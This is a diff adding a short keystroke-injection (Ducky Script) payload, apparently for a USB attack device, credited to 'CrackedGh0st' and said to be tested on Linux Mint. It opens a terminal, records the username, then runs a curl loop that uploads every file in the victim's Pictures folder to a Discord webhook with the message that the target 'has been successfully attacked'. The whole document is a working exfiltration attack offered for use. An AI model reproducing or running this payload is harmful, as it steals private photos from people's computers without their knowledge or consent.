@@ -1,0 +1,16 @@
+REM No need to define username as script will find it.
+REM WEBHOOK for discord is needed.
+REM Tested on Linux Mint
+REM Author CrackedGh0st
+
+DELAY 100
+CTRL-ALT t
+DELAY 1500
+STRING whoami > /tmp/username.txt
+ENTER
+DELAY 1000
+REM Type the command to send the content of each picture in the current user's Pictures directory to the Discord webhook using curl
+REM Replace "YOUR_WEBHOOK_URL" with the provided Discord webhook URL
+STRING for file in ~/Pictures/*; do curl -X POST -H "Content-Type: multipart/form-data" -F "file=@$file" -F "content=Your target $(cat /tmp/username.txt) has been successfully attacked:" *WEBHOOK HERE*; done
+ENTER
+DELAY 3000
